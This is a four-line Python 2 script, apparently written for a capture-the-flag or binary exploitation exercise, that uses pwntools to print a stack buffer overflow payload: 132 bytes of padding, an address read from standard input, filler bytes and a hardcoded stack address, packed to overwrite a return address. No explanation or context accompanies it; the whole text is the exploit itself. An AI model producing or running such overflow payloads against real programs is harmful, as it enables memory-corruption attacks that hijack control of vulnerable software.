import sys
from pwn import *
x = str(sys.stdin.readline());
print "A" *132+ p32(int(x)) + "GGGG" + p32(0xffffd622)
